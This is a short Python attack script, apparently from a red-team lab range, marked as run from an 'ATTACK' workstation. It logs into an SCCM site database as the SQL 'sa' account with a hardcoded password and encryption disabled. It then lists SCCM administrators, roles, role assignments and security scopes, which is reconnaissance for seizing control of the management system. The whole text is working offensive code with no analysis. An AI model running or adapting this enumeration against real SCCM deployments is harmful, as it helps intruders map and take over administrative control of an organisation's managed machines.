# SCCM DB enumeration via sa (pyodbc) — analyst_t1 (ws01 ATTACK)
import pyodbc, sys

servers = [
    'mbr02.range.local,1433',
    'mbr02.range.local',
]
drivers = ['ODBC Driver 18 for SQL Server', 'ODBC Driver 17 for SQL Server', 'SQL Server Native Client 11.0', 'SQL Server']

conn = None
for srv in servers:
    for drv in drivers:
        try:
            cs = ('DRIVER={%s};SERVER=%s;DATABASE=CM_CAD;UID=sa;PWD=s@_P@ssw0rd!L@b!;'
                  'Encrypt=no;TrustServerCertificate=yes;Connection Timeout=8' % (drv, srv))
            conn = pyodbc.connect(cs)
            print('[+] connected: driver=%s server=%s' % (drv, srv))
            break
        except Exception as e:
            continue
    if conn: break
if not conn:
    print('[!] all driver/server combos failed')
    # list available drivers
    print('available drivers:', pyodbc.drivers())
    sys.exit(1)

def q(title, query):
    print('\n=== %s ===' % title)
    try:
        cur = conn.cursor()
        cur.execute(query)
        rows = cur.fetchall()
        if not rows:
            print('(no rows)')
        for r in rows:
            print(list(r))
    except Exception as e:
        print('ERR: %s' % e)

q('SMS_Admin (all admins)', "SELECT AdminID, LogonName, IsGroup FROM SMS_Admin")
q('SMS_Role (roles)', "SELECT RoleID, RoleName FROM SMS_Role")
q('SMS_AdminRole (admin->role)', "SELECT AdminID, RoleID FROM SMS_AdminRole")
q('SMS_AdminCategory (admin->scope/category)', "SELECT * FROM SMS_AdminCategory")
q('SMS_Category (categories/scopes)', "SELECT CategoryID, CategoryName, CategoryType FROM SMS_Category")
print('\nSQL_ENUM_DONE')
